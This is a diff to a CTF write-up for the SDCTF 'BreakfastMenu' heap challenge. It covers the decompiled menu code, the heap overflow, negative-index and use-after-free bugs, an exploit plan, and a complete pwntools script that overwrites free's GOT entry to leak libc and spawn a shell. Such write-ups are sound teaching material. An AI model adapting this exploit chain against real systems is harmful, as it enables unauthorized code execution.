@@ -197,11 +197,11 @@ Here the `temp` is just a global variable and it is initially 0 when the binary 
 
   - - -
 
-  > **Description** : I’m awfully hungry, with all these options to choose from, what should I order?
-  > **Challenge File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)[binary](https://cdn.discordapp.com/attachments/808487148332122144/972248049038544926/BreakfastMenu)
-  > **Docker File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)[binary](https://cdn.discordapp.com/attachments/808487148332122144/972248478430404608/Dockerfile)
-  > **Solves** : 32
-  > **Points** : 250
+  > **Description** : I’m awfully hungry, with all these options to choose from, what should I order? <br>
+  > **Challenge File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)\[binary] <br>(https://cdn.discordapp.com/attachments/808487148332122144/972248049038544926/BreakfastMenu)
+  > **Docker File** : [](https://cdn.discordapp.com/attachments/808487148332122144/972245498331271168/OilSpill)\[binary] <br>(https://cdn.discordapp.com/attachments/808487148332122144/972248478430404608/Dockerfile)
+  > **Solves** : 32 <br>
+  > **Points** : 250 <br>
   >
   > # Checksec
 
@@ -220,57 +220,57 @@ Here the `temp` is just a global variable and it is initially 0 when the binary 
   - - -
 
   ```c
-  int __cdecl __noreturn main(int argc,
+  int main(int argc,
       const char ** argv,
           const char ** envp) {
       int OPTION; // [rsp+10h] [rbp-10h] BYREF
       int GLOBAL_IDX; // [rsp+14h] [rbp-Ch]
       unsigned __int64 v5; // [rsp+18h] [rbp-8h]
 
-      v5 = __readfsqword(0x28 u);
+      v5 = __readfsqword(0x28);
       puts("Welcome to the SDCTF cafe!\n");
       puts(
           "This restaurant works a little different than normal ones. First, tell us if you want to make a new order, then you "
           "can change or delete orders.\n");
-      fflush(_bss_start);
+      fflush(stdout);
       GLOBAL_IDX = 0;
       while (1) {
           puts("1. Create a new order\n2. Edit an order\n3. Delete an order\n4. Pay your bill and leave");
-          fflush(_bss_start);
+          fflush(stdout);
           memset(buf, 0, sizeof(buf));
           __isoc99_scanf("%d", & OPTION);
           getchar();
           if (OPTION == 2) {
               puts("which order would you like to modify");
-              fflush(_bss_start);
+              fflush(stdout);
               __isoc99_scanf("%d", & OPTION);
               getchar();
               if (GLOBAL_IDX <= OPTION)
                   goto INVALID;
               puts("We have eggs, cereal, waffles and french toast. \nWhat would you like to order?");
-              fflush(_bss_start);
+              fflush(stdout);
               if (fgets(buf, 64, stdin)) {
                   printf("so you wanted %s", buf);
-                  fflush(_bss_start);
+                  fflush(stdout);
               }
               strcpy(orders[OPTION], buf);
           } else if (OPTION > 2) {
               if (OPTION != 3) {
                   if (OPTION == 4) {
                       puts("thanks for coming!");
-                      fflush(_bss_start);
+                      fflush(stdout);
                       exit(0);
                   }
                   LABEL_21:
                       exit(0);
               }
               puts("which order would you like to remove");
-              fflush(_bss_start);
+              fflush(stdout);
               __isoc99_scanf("%d", & OPTION);
               getchar();
               if (GLOBAL_IDX <= OPTION) {
                   INVALID: puts("Order doesn't exist!!!");
-                  fflush(_bss_start);
+                  fflush(stdout);
               }
               else {
                   free(orders[OPTION]);
@@ -279,13 +279,109 @@ Here the `temp` is just a global variable and it is initially 0 when the binary 
               if (OPTION != 1)
                   goto LABEL_21;
               if (GLOBAL_IDX <= 15) {
-                  orders[GLOBAL_IDX++] = malloc(40 uLL);
+                  orders[GLOBAL_IDX++] = malloc(40);
                   puts("A new order has been created");
               } else {
                   puts("Too many orders, you can't be making any more!!!");
               }
-              fflush(_bss_start);
+              fflush(stdout);
           }
       }
   }
   ```
+
+<span style="color:red">
+This is the \\*\\*worst\\*\\* way of creating a heap challenge. </span>. 
+
+The author `green beans` just why would did you keep all the code in main function. The decompiled code looks so ugly. And then comes those `fflush` function. 
+
+![](https://i.imgur.com/TZHR9di.png)
+
+The options looks like this
+
+1. Create a note of size 40 bytes and increment `GLOBAL_IDX.` Store the heap pointer to an array of pointers in bss that's the `orders` array.
+2. Modify/write the contents to any notes that you have already created. It does this by taking 64 bytes of input from stdin using `fgets` function to a global buffer `buf` and then uses `strcpy` to copy the contents of `buf` variable to `orders[idx]`.
+3. Free any note that you have already created.
+4. Exit.
+
+The bugs in this challenge are :
+
+1. The edit option has an **heap overflow** bug. It copies 64 bytes to a 0x31 sized chunk.
+2. While specifying the index , it allows **negative indexing**. With this you can overwrite the contents in stdout structure in libc. But it uses `strcpy` to copy the contents so its painful to do any fsop.
+3. **Use After Free & Double free** bug. This allows **Write After Free** primitive.
+
+![](https://i.imgur.com/bfNf1Li.jpg)
+
+For leaks overwrite `free` got with `printf`. So that you can then have a **format string bug** when you delete a note. It will then do `printf(our_input)` instead of actually freeing it.
+
+> # Exploit
+
+- - -
+
+1. Create a chunk `A`.
+2. Delete that chunk `A`.
+3. Using the **write after free** bug. Edit chunk `A` to overwrite its fd with the got address of `free`.
+4. Overwrite `free` got with `printf` plt to create a format string bug scenario to get leaks.
+5. Edit chunk `A` with `%11$p`.
+6. Delete chunk `A`.
+7. Get libc leak.
+8. Edit the chunk back again and overwrite `free` got with `system` this time.
+9. Edit chunk `A` with "/bin/sh".
+10. Delete chunk `A`.
+11. Get shell
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from time import sleep
+
+exe  = context.binary = ELF('./BreakfastMenu')
+host = args.HOST or 'breakfast.sdc.tf'
+port = int(args.PORT or 1337)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+idx=-1
+
+def choice(cmd):
+	sla("4. Pay your bill and leave\n", str(cmd))
+
+def create():
+	global idx
+	choice(1)
+	idx=idx+1
+	return idx
+
+def edit(idx, data):
+	choice(2)
+	sla("which order would you like to modify\n", str(idx))
+	sla("What would you like to order?\n", data)
+
+def delete(idx):
+	choice(3)
+	sla("which order would you like to remove\n", str(idx))
+
+libc=SetupLibcELF()
+io = start()
+A=create()
+delete(A)
+edit(A, p64(exe.got.free - 8))
+junk=create()
+target=create() # returns heap above the free got
+edit(target, b"A"*8 + p(exe.sym.printf))
+edit(A, "%9$p||%10$p||%11$p||%12$p||%13$p||%14$p||%15$p||%16$p")
+delete(A) # trigger format string bug
+leaks=GetInt(rl())
+libc.address = leaks[2]-0x21c87
+lb()
+edit(target, b"A"*8 + p(libc.sym.system))
+edit(A, "/bin/sh\x00")
+delete(A)
+io.interactive()
+```
